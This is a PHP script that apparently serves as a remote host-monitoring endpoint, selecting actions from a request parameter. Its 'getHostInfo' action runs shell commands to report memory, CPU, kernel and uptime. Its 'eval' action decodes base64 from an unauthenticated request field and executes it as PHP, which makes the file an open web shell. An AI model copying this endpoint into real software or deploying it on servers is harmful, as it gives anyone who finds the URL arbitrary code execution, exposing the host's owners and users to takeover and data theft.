<?php

    /**
     * Copyright (c) 2022 Roman Grinko <rsgrinko@gmail.com>
     * Permission is hereby granted, free of charge, to any person obtaining
     * a copy of this software and associated documentation files (the
     * "Software"), to deal in the Software without restriction, including
     * without limitation the rights to use, copy, modify, merge, publish,
     * distribute, sublicense, and/or sell copies of the Software, and to
     * permit persons to whom the Software is furnished to do so, subject to
     * the following conditions:
     * The above copyright notice and this permission notice shall be included
     * in all copies or substantial portions of the Software.
     * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
     * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
     * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
     * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
     * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
     * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
     * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
     */

    //$_SERVER['DOCUMENT_ROOT'] = '/home/rsgrinko/sites/dev.it-stories.ru';
    //require_once $_SERVER['DOCUMENT_ROOT'] . '/core/bootstrap.php';

    class HostFunctions
    {
        public static $cmd = 'default';

        public static function toOut($data, $status = 'success')
        {
            $result = [
                'status' => $status,
                'cmd'    => self::$cmd,
                'time'   => time(),
                'data'   => $data,
            ];
            header('Content-Type: application/json; charset=utf-8');
            echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        }

        public static function getHostInfo()
        {
            $result = [];
            $output = [];
            exec('free -h', $output, $code);
            $result['memory'] = implode(PHP_EOL, $output);

            $output = [];
            exec('cat /proc/cpuinfo', $output, $code);
            $result['cpuinfo'] = implode(PHP_EOL, $output);

            $output = [];
            exec('uname -a', $output, $code);
            $result['uname'] = implode(PHP_EOL, $output);

            $output = [];
            exec('hostname', $output, $code);
            $result['hostname'] = implode(PHP_EOL, $output);

            $output = [];
            exec('uptime', $output, $code);
            $result['uptime'] = implode(PHP_EOL, $output);

            $result['ip'] = $_SERVER['SERVER_ADDR'];

            return $result;
        }
    }


    $commandList        = [
        'ping',
        'getHostInfo',
        'getHostIp',
        'eval',
    ];
    $command            = $_REQUEST['cmd'] ?? 'default';
    HostFunctions::$cmd = $command;
    switch ($command) {
        case 'getCommands':
            HostFunctions::toOut($commandList);
            break;
        case 'ping':
            HostFunctions::toOut('pong');
            break;
        case 'getHostInfo':
            $result = HostFunctions::getHostInfo();
            HostFunctions::toOut($result);
            break;

        case 'getHostIp':
            HostFunctions::toOut($_SERVER['SERVER_ADDR']);
            break;

        case 'eval':
            $evalString = isset($_REQUEST['evalString']) ? base64_decode($_REQUEST['evalString']) : null;
            if ($evalString === null) {
                HostFunctions::toOut('No eval string', 'error');
            } else {
                ob_start();
                try {
                    eval($evalString);
                    $result = ob_get_clean();
                } catch (Throwable $t) {
                    $result = 'Error on line ' . $t->getLine() . ': ' . $t->getMessage();
                    ob_clean();
                }
                HostFunctions::toOut($result);
            }
            break;

        default:
            HostFunctions::toOut('Command not found', 'error');
            break;
    }

